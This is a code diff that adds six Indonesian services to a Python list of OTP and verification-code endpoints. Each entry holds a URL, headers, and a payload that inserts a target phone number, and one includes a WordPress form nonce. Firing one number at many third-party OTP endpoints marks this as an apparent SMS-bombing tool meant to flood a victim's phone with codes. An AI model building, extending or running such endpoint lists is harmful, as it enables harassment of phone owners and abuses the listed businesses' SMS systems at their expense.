@@ -42,4 +42,10 @@ def _x(ph):
         ("Trive","https://api.trive.co.id/api/auth/send-verification-code",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fnocode(ph),"countryCode":"+62"}),
         ("ITSolution","https://forum.itsolution.id/api/request_otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f62(ph)}),
         ("SobatWarung","https://sobatwarung.id/api/auth/otp/send",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph)}),
-                                                                                                                                                                                                                                                                                        ]
+        ("CeriaPlaydate","https://api.ceriaplaydate.id/api/v1/auth/send-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph)}),
+        ("CWorld","https://cworld.id/wp-admin/admin-ajax.php",{"Content-Type":"application/x-www-form-urlencoded"},{"user_email":_f08(ph),"user_phone":_f08(ph),"otpType":"phone","security":"c391eb7d1f","action":"miniorange-wpform-send-otp","is_form":True}),
+        ("D2Shop","https://d2shop.co.id/services/identity/RequestOTP",{"Content-Type":"application/x-www-form-urlencoded"},{"destination":_f08(ph),"otpLength":"6","is_form":True}),
+        ("LittleHands","https://api.littlehands.id/api/v1/auth/send-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph)}),
+        ("Aice","https://api.aicegotyou.id/api/v1/auth/phone/request-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_f08(ph),"purpose":"register"}),
+        ("ArunaBooks","https://arunabooks.id/api/auth/customer/request-otp",{"Content-Type":"application/json","Accept":"application/json"},{"phone":_fnocode(ph)}),
+    ]
